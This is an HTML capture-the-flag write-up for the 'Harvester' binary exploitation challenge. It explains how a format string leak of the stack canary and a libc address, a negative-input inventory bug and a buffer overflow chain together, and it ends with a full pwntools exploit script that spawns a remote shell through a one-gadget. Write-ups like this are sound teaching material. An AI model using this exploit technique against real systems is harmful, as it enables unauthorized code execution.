@@ -1,0 +1,158 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>Harvester</h1>
+            <h2>April 2021</h2>           
+            <h3>Format String Leak + bof w/ One Gadget</h3>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+        These giant bird-looking creatures come once a day and harvest everything from our farms, leaving nothing but soil behind. We need to do something to stop them, otherwise there will be no food left for us. It will be even better instead of stopping them, tame them and take advantage of them! They seem to have some artificial implants, so if we hack them, we can take advantage of them. These creatures seem to love cherry pies for some reason.. <a href=../../docs/cyber_apocalypse/harvester>controller</a> <a href=../../docs/cyber_apocalypse/libc.so.6>libc.so.6</a>
+    	<br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary and a libc to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
+        <br>
+    	Using checksec on the binary we can see that it is fully equipped with all protections. 
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/harvester1.png" alt="">
+</div>
+
+<div class="paragraph">
+    <p>
+        <br><br>
+        While statically analyzing the binary I spotted 3 vulnerabilities, which when chained together allow us to spawn a shell. The first vulnerability is a format string exploit that we can use to leak both the stack canary and an address from libc. The second vulnerability reads in our input without checking for negative values, which lets us perform unwanted actions. The third vulnerability is a buffer overflow that we can trigger using the second vulnerability.
+        <br>
+        The first vulnerability lies in the 'fight' function. When asking us for our weapon of choice, it reads in 5 bytes of data, and then prints these out using printf without using format specifiers. This means that we can leak stack values stored on the stack by inputting format specifiers such as %p. As it turns out,  the 11th position on the stack, leaked out with '%11$p' contains the stack canary, while the 3rd value on the stack, leaked out with '%3$p' contains a libc address. These leaks will become very important later on in our exploit.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/harvester2.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        In the stare function we can find a buffer overflow vulnerability that reads in 64 bytes into a 38 byte buffer. There is however one issue. To trigger this bug we first need to set our amount of pies to 22. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/harvester3.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        While carefully analyzing the remaining functions I found the 2nd vulnerability in the inventory function. It asks us if we want to drop some pies, however if we input a negative number, we can instead add pies. Like this we can set the amount of pies to 22 and trigger the vulnerability by calling the stare function.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/harvester4.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Now that we have found the vulnerabilities, we can start working on our exploit. 
+        <br>
+        We start off by calling the 'fight' function twice to leak both the stack cookkie and an address from libc. Next we call the inventory function to set the appropriate amount of pies and trigger the buffer overflow vulnerability before sending in our payload. This payload consists of padding, the stack cookie leak, and a one gadget used to spawn a shell. The address of this one gadget was calculated using the earlier leaked libc address. 
+        <br>
+        We could have overwritten rbp with the beginning of our 40 byte padding, and used a leave gadget to stack pivot to this value, and execute a system(binsh) shell that way, however the one gadget was much more convenient in this case due to the limited available buffer size. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/harvester5.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Executing our exploit against the remote target spawns a shell which we can use to read out the flag.
+        <br> 
+        The full exploit script is posted below. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/harvester6.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+
+from pwn import *
+elf = context.binary = ELF('./harvester')
+libc = elf.libc
+
+local = False
+
+if local:
+    p = elf.process()
+else:
+    host = '138.68.187.25'
+    port = 30023
+    p = remote(host,port)
+
+p.clean()
+p.sendline('1')
+p.clean()
+p.sendline('%11$p')
+p.readuntil('Your choice is: ')
+data = p.readuntil('\n').strip()[:-7]   #Leak Cookie
+p.clean()
+
+cookie = int(data,16)
+
+p.clean()
+p.sendline('1')
+p.clean()
+p.sendline('%3$p')
+p.readuntil('Your choice is: ')
+data = p.readuntil('\n').strip()        #Leak Libc Address
+print(data)
+p.clean()
+
+leak = int(data,16)
+
+libc.address = leak - 0xe4774           #Libc Base
+one = p64(libc.address + 0x4f3d5)       #One Gadget
+
+payload = b'A'*40 + p64(cookie) + b'A'*8 + one
+
+p.clean()
+p.sendline('2')
+p.clean()
+p.sendline('y')
+p.clean()
+p.sendline('-11')                       #Set cookies to 22 to trigger buffer overflow
+p.clean()
+p.sendline('3')
+p.sendline(payload)
+
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
+
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
